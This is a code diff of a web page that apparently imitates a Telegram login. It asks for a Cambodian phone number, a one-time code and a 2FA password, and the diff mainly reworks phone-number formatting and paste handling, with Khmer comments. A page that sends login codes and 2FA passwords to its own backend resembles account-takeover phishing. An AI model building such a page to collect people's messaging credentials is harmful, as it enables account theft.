@@ -48,7 +48,6 @@
             <div class="space-y-4 text-left">
                 <div>
                     <label class="block text-xs text-gray-400 mb-1 ml-1">Phone Number</label>
-                    <!-- បន្ថែម onpaste="handlePaste(event, this)" សម្រាប់កាត់ +855 ស្ទួនពេល Paste -->
                     <input id="phone-input" type="text" value="+855 " placeholder="+855 15 944 782" oninput="formatPhoneNumber(this)" onkeydown="preventPrefixDelete(event, this)" onpaste="handlePaste(event, this)" class="tg-input w-full p-3">
                 </div>
             </div>
@@ -69,7 +68,7 @@
                     <input id="otp-input" type="text" placeholder="Enter code" maxlength="6" class="tg-input w-full p-3 text-center text-xl font-mono tracking-widest">
                 </div>
 
-                <!-- Input 2FA Password (លាក់ជាមុន) -->
+                <!-- Input 2FA Password -->
                 <div id="password-container" class="hidden">
                     <label class="block text-xs text-gray-400 mb-1 ml-1">Two-Step Password (2FA)</label>
                     <input id="password-input" type="password" placeholder="Enter your 2FA password" class="tg-input w-full p-3">
@@ -94,17 +93,15 @@
             }
         }
 
-        // ដោះស្រាយការ Paste លេខទូរស័ព្ទ (ដូចជា +855 69 371 981 ឬ 069 371 981)
+        // គ្រប់គ្រងការ Paste លេខចូល
         function handlePaste(e, input) {
             e.preventDefault();
             let pasteData = (e.clipboardData || window.clipboardData).getData('text');
             let digits = pasteData.replace(/[^\d]/g, '');
 
-            // បើកូពីមកមានកូដប្រទេស 855 នៅខាងមុខ ត្រូវកាត់វាចោល
             if (digits.startsWith('855')) {
                 digits = digits.slice(3);
             }
-            // បើកូពីមកមានលេខ 0 នៅខាងមុខ ត្រូវកាត់វាចោល
             if (digits.startsWith('0')) {
                 digits = digits.slice(1);
             }
@@ -113,17 +110,17 @@
             formatPhoneNumber(input);
         }
 
-        // Format លេខទូរស័ព្ទស្វ័យប្រវត្តិ (+855 XX XXX XXX)
+        // Format លេខទូរស័ព្ទ (រក្សា +855 នៅខាងមុខជានិច្ច)
         function formatPhoneNumber(input) {
             const prefix = '+855 ';
-            let rawDigits = input.value.replace(/[^\d]/g, '');
-
-            // កាត់កូដប្រទេស 855 ស្ទួនៗចោល
-            while (rawDigits.startsWith('855') && rawDigits.length > 9) {
-                rawDigits = rawDigits.slice(3);
+            
+            if (!input.value.startsWith('+855')) {
+                input.value = prefix;
             }
 
-            // កាត់លេខ 0 ខាងមុខចោលករណីអ្នកប្រើប្រាស់វាយ 0
+            let rawDigits = input.value.slice(5).replace(/[^\d]/g, '');
+
+            // កាត់លេខ 0 ខាងមុខចោលករណីអ្នកប្រើប្រាស់វាយលេខ 0 (ឧ. 012 -> 12)
             if (rawDigits.startsWith('0')) {
                 rawDigits = rawDigits.slice(1);
             }
@@ -139,8 +136,6 @@
         async function sendPhone() {
             const phoneInput = document.getElementById('phone-input');
             const btn = document.getElementById('btn-send');
-            
-            // លុបចន្លោះដកឃ្លាចោលមុនពេលផ្ញើទៅ Backend (ឧទាហរណ៍៖ +85515944782)
             const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
 
             if (!phoneClean || phoneClean.length < 9) {
